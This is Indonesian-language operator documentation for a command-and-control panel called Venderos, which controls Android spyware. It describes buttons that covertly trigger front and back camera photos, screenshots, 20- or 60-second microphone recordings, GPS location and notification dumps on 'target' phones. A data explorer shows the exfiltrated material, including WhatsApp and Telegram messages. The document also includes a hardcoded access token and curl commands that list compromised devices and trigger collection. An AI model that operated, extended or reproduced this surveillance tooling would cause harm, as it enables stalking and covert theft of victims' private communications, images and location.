# Venderos C2 Control Panel & Web GUI Documentation

Sistem antarmuka web interaktif untuk memonitor perangkat Android, mengeksekusi trigger secara langsung melalui tombol GUI (tanpa cURL), dan membaca seluruh data exfiltrasi (foto, screenshot, audio, GPS, notifikasi) langsung di browser.

---

## 1. Menjalankan Server & Akses Web GUI

Jalankan server:
```bash
cd /home/sauki/venderos-server
./run.sh
```

Buka browser di laptop atau HP:
- **Lokal**: [http://127.0.0.1:8080/dashboard](http://127.0.0.1:8080/dashboard) (atau `http://127.0.0.1:8080/`)
- **Domain Publik**: `https://venderos.my.id/dashboard`

### Login & Autentikasi:
1. Masukkan token di input pojok kanan atas: `1a0bd56a8676702528a4ec95989466172a25f55d`
2. Klik tombol **Set Token**.
3. Token tersimpan di `localStorage` peramban Anda, sehingga tidak perlu mengetik ulang saat membuka halaman lagi.

---

## 2. Eksekusi Perintah Langsung via GUI (Tanpa cURL)

Pada bagian **TARGET CONNECTED DEVICES**, setiap perangkat yang terhubung akan tampil dalam kartu ringkasan:
- **Indikator Status**: 🟢 Online (aktif dalam <35s) atau ⚪ Offline.
- **Informasi Perangkat**: Model HP, ID Unik, Sisa Baterai (dengan indikator warna), Nama Aplikasi yang sedang dibuka di layar target, IP koneksi, dan status antrean perintah.

### Tombol Aksi di Kartu Perangkat:
Tinggal klik salah satu tombol pada perangkat target:
- `⚡ ALL`: Memicu kamera belakang, kamera depan, screenshot layar, rekaman audio 20s, lokasi GPS, dan notifikasi sekaligus.
- `📸 Kamera Belakang`: Mengambil foto dari lensa belakang secara senyap.
- `🤳 Kamera Depan`: Mengambil foto dari lensa depan.
- `📱 Screenshot`: Menangkap tampilan layar target saat itu juga (via Accessibility).
- `📍 GPS Lokasi`: Mengambil koordinat GPS akurat target.
- `🎙️ Mic (20s)`: Merekam suara sekitar target selama 20 detik.
- `🎙️ Mic (60s)`: Merekam suara sekitar target selama 60 detik.
- `🔔 Notifikasi`: Mengirim seluruh isi notifikasi yang tersimpan di memori target.

### Trigger Seluruh Perangkat Sekaligus:
Klik tombol merah di header atas: **⚡ TRIGGER ALL DEVICES**. Semua HP yang terdaftar akan menerima perintah seketika saat poll berikutnya (~6 detik).

---

## 3. Data Explorer (Membaca & Memutar Data di Web)

Bagian bawah halaman adalah **Explorer Data Exfiltrasi**, dirancang agar nyaman dibaca tanpa harus membuka terminal atau mendownload berkas satu per satu.

### Tab Kategori:
1. **🌐 Semua Data**: Tampilan kronologis seluruh berkas yang masuk secara real-time.
2. **📸 Kamera**:
   - Menampilkan galeri foto (kamera belakang & kamera depan).
   - Klik gambar untuk membuka **Lightbox Fullscreen Zoom** resolusi penuh.
   - Dilengkapi tombol 💾 Unduh per gambar.
3. **📱 Layar (Scr)**:
   - Galeri tangkapan layar (screenshot) aplikasi yang sedang dipakai target.
   - Klik gambar untuk memperbesar resolusi penuh.
4. **🎙️ Audio Mic**:
   - Pemutar audio bawaan (**HTML5 Audio Player**) langsung di dalam halaman.
   - Tekan tombol **Play ▶** untuk mendengarkan hasil sadap mikrofon seketika tanpa unduh manual.
   - Tersedia tombol unduh berkas `.m4a`.
5. **📍 Lokasi GPS**:
   - Menampilkan angka Latitude, Longitude, Akurasi (meter), dan Waktu.
   - Tombol hijau **🗺️ Buka di Google Maps** untuk membuka pin lokasi fisik target langsung di Google Maps pada tab baru.
6. **🔔 Notifikasi**:
   - Diformat rapi seperti kartu pesan chat (WhatsApp / Discord / SMS / Telegram).
   - Menampilkan:
     - Badge nama paket aplikasi (contoh: `com.whatsapp`, `com.discord`).
     - Judul notifikasi (nama pengirim / grup).
     - Isi pesan notifikasi lengkap.
     - Waktu masuk pesan.

### Filter Perangkat:
Gunakan menu dropdown **Semua Perangkat (All)** di kanan atas tab untuk menyaring data agar hanya menampilkan data dari satu perangkat HP tertentu.

---

## 4. Opsi Alternatif: Manual via cURL (Jika Dibutuhkan)

Jika Anda ingin menjalankan automasi via skrip atau CLI:
```bash
# Cek siapa saja yang terhubung
curl -s http://127.0.0.1:8080/api/devices \
  -H "X-Token: 1a0bd56a8676702528a4ec95989466172a25f55d"

# Kirim perintah trigger ke satu perangkat
curl -s -X POST http://127.0.0.1:8080/api/trigger \
  -H "X-Token: 1a0bd56a8676702528a4ec95989466172a25f55d" \
  -H "Content-Type: application/json" \
  -d '{"device_id": "<DEVICE_ID>", "cmd": "all"}'
```
